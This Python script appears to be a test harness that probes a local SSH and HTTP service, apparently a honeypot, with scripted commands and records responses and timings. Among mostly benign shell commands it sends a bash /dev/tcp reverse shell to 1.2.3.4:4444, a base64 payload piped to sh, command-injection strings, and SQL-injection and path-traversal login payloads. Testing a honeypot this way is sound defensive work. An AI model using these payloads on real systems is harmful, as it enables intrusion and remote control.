import time
import requests
import paramiko
import json

def execute_ssh_scenarios():
    scenarios = []
    
    # We will establish a single persistent shell for context consistency
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect("127.0.0.1", port=2222, username="root", password="password", timeout=5)
    except Exception as e:
        print(f"Failed to connect SSH: {e}")
        return [{"name": "SSH Connection Error", "out": str(e)}]

    shell = client.invoke_shell()
    shell.settimeout(3.0)
    time.sleep(1)
    if shell.recv_ready():
        shell.recv(4096) # clear banner
        
    def run_cmd(cmd):
        start = time.time()
        shell.send(cmd + "\n")
        time.sleep(0.5)
        out = ""
        while shell.recv_ready():
            try:
                out += shell.recv(4096).decode('utf-8', errors='ignore')
            except:
                break
        elapsed = time.time() - start
        
        # Keep raw output
        return elapsed, out

    # Group 1
    t, out = run_cmd("pwd")
    scenarios.append({"name": "1. pwd", "cmd": "pwd", "out": out, "time": t})
    t, out = run_cmd("ls")
    scenarios.append({"name": "2. ls", "cmd": "ls", "out": out, "time": t})
    run_cmd("mkdir dir123") 
    t, out = run_cmd("cd dir123")
    t, out2 = run_cmd("pwd")
    scenarios.append({"name": "3. cd valid", "cmd": "cd dir123; pwd", "out": out + "\n" + out2, "time": t})
    t, out = run_cmd("cd nonexistent")
    scenarios.append({"name": "4. cd invalid", "cmd": "cd nonexistent", "out": out, "time": t})
    t, out = run_cmd("touch test.txt")
    scenarios.append({"name": "5. touch", "cmd": "touch test.txt", "out": out, "time": t})

    # Group 2
    run_cmd("echo 'SECRET' > credentials.txt")
    t, out = run_cmd("cat credentials.txt")
    scenarios.append({"name": "6. cat existing file", "cmd": "cat credentials.txt", "out": out, "time": t})
    t, out = run_cmd("cat unknown.txt")
    scenarios.append({"name": "7. cat non-existing file", "cmd": "cat unknown.txt", "out": out, "time": t})

    # Group 3
    t1, out1 = run_cmd("ls")
    t2, out2 = run_cmd("ls")
    t3, out3 = run_cmd("ls")
    scenarios.append({"name": "8. repeated ls", "cmd": "ls x3", "out": out1 + " | " + out2 + " | " + out3, "time": (t1+t2+t3)/3})
    t1, out1 = run_cmd("cat credentials.txt")
    t2, out2 = run_cmd("cat credentials.txt")
    scenarios.append({"name": "9. repeated cat", "cmd": "cat credentials.txt x2", "out": out1 + " | " + out2, "time": (t1+t2)/2})

    # Group 4
    t, out = run_cmd("asdasd")
    scenarios.append({"name": "10. random command", "cmd": "asdasd", "out": out, "time": t})

    # Group 5
    t, out = run_cmd("whoami")
    scenarios.append({"name": "11. whoami", "cmd": "whoami", "out": out, "time": t})
    t, out = run_cmd("id")
    scenarios.append({"name": "12. id", "cmd": "id", "out": out, "time": t})

    # Group 6
    t, out = run_cmd("ls; whoami")
    scenarios.append({"name": "13. command injection", "cmd": "ls; whoami", "out": out, "time": t})
    t, out = run_cmd("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    scenarios.append({"name": "14. reverse shell attempt", "cmd": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "out": out, "time": t})
    t, out = run_cmd("echo d2hvYW1p | base64 -d | sh")
    scenarios.append({"name": "15. base64 payload", "cmd": "echo d2hvYW1p | base64 -d | sh", "out": out, "time": t})

    # Group 8
    run_cmd("cd /root")
    run_cmd("mkdir -p secret")
    run_cmd("cd /root/secret")
    t4, out4 = run_cmd("pwd")
    t5, out5 = run_cmd("ls")
    scenarios.append({"name": "19. directory persistence", "cmd": "cd /root/secret; pwd; ls", "out": out4 + " | " + out5, "time": (t4+t5)/2})

    client.close()
    return scenarios
    
def execute_http_scenarios():
    scenarios = []
    url = "http://127.0.0.1:8080/login"
    
    def test_http(payload, name):
        start = time.time()
        try:
            res = requests.post(url, data={"username": payload, "password": "password"}, timeout=5)
            elapsed = time.time() - start
            scenarios.append({"name": name, "cmd": payload, "out": f"Code: {res.status_code}, Body: {res.text.strip()[:100]}", "time": elapsed})
        except Exception as e:
            elapsed = time.time() - start
            scenarios.append({"name": name, "cmd": payload, "out": f"Error: {e}", "time": elapsed})

    test_http("' OR 1=1 --", "16. SQL Injection")
    test_http("../../../etc/passwd", "17. Path Traversal")
    test_http("; whoami", "18. Command Injection (HTTP)")
    
    return scenarios

if __name__ == "__main__":
    res = execute_ssh_scenarios()
    res += execute_http_scenarios()
    print(json.dumps(res, indent=2))
